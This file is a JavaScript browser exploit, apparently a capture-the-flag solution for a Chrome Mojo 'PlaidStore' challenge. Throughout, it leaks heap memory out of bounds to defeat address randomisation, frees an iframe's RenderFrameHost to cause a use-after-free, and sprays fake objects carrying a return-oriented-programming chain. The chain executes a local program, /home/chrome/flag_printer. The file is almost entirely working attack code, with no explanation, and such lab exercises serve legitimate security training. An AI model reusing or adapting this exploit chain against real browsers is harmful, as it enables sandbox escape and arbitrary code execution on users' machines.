async function a() {
	plaidstores_arr = [];
	let p = blink.mojom.PlaidStore.getRemote(true);
	for(let i = 0 ; i < 0x40 ; i++){
		await p.storeData("BBBB",new Uint8Array(0x28).fill(0x41));
		plaidstores_arr[i] = blink.mojom.PlaidStore.getRemote(true);
	}
	
	chromeBase = 0;
	renderFrameHost = 0;

	for(let i = 0 ; i < 0x40 ; i++){
		data_leak = (await p.getData("BBBB", 0x200)).data;
		let uint8 = new Uint8Array(data_leak);
		let uint64 = new BigInt64Array(uint8.buffer);
		for(let i = 0;i<uint64.length ; i++){
			let high = uint64[i] & BigInt(0xf00000000000);
			let low = uint64[i] & BigInt(0x000000000fff);
			// console.log('0x' + uint64[i].toString(16));
			if( (high == BigInt(0x500000000000)) &&  low == BigInt(0x7a0)){
				console.log('0x' + uint64[i].toString(16));
				chromeBase = uint64[i] - BigInt(0x9fb67a0);
				renderFrameHost = uint64[i+1];
				break;
			}
		}
	}
	console.log("got leaks");
	console.log("Chrome base : 0x" + chromeBase.toString(16));
	console.log("RenderFrameHost : 0x" + renderFrameHost.toString(16));
	const kRenderFrameHostSize = 0xc28;

	var frameData = new ArrayBuffer(kRenderFrameHostSize);
	var frameData8 = new Uint8Array(frameData).fill(0x41);
	var frameDataView = new DataView(frameData);
	var ropchainView = new BigInt64Array(frameData,0x10);
	frameDataView.setBigInt64(0x160+0x0,chromeBase + 0x880dee8n,true);
	frameDataView.setBigInt64(0x160+0x8,chromeBase + 0x880dee8n,true);
	frameDataView.setBigInt64(0x160+0x10,chromeBase + 0x880dee8n,true);
	frameDataView.setBigInt64(0x160+0x18,chromeBase + 0x880dee8n,true);
	frameDataView.setBigInt64(0x160+0x20,chromeBase + 0x880dee8n,true);

	// frameDataView.setBigInt64(0x160+0x28,0x4141414142424242n,true);
	frameDataView.setBigInt64(0x180, 0x2f686f6d652f6368n,false);
	frameDataView.setBigInt64(0x188, 0x726f6d652f666c61n,false);
	frameDataView.setBigInt64(0x190, 0x675f7072696e7465n,false);// /home/chrome/flag_printer\0; big-endian
	frameDataView.setBigInt64(0x198, 0x7200000000000000n,false);// /home/chrome/flag_printer\0; big-endian
	ropchainView[0] = 0xdeadbeefn;
	ropchainView[1] = chromeBase + 0x2e4630fn;
	ropchainView[2] = 0x4141414142424242n;
	ropchainView[3] = chromeBase + 0x2e651ddn;
	ropchainView[4] = chromeBase + 0x9efca30n;
	ropchainView[5] = chromeBase + 0x8d08a16n;

	var allocateframe = () => {
		var frame = document.createElement('iframe');
		frame.setAttribute("src","/iframe.html");
		document.body.appendChild(frame);
		return frame;
	}

	var frame = allocateframe();
	frame.contentWindow.addEventListener("DOMContentLoaded",async () => {
		if(!(await frame.contentWindow.leak())){
			console.log("no leak");
			return;
		}
		if(frame.contentWindow.chromeBase != chromeBase){
			console.log("different chrome base !!");
			return;
		}
		var frameAddr = frame.contentWindow.renderFrameHost;
		console.log("frame addr:0x"+frameAddr.toString(16));
		frameDataView.setBigInt64(0,frameAddr + 0x10n,true);
		ropchainView[2] = frameAddr + 0x180n;
		var frameStore = frame.contentWindow.p;
		frame.remove();
		frame = 0;
		var arr = [];

		for(let i = 0;i<0x400;i++){
			await p.storeData("bruh" + i,frameData8);
		}

		await frameStore.getData("yeet0",0);

	});
	// console.log(data_leak);
	
}


document.addEventListener("DOMContentLoaded",()=>{a();});

// _ZN7content14PlaidStoreImpl7GetDataERKNSt3__112basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEEjN4base12OnceCallbackIFvRKNS1_6vectorIhNS5_IhEEEEEEE
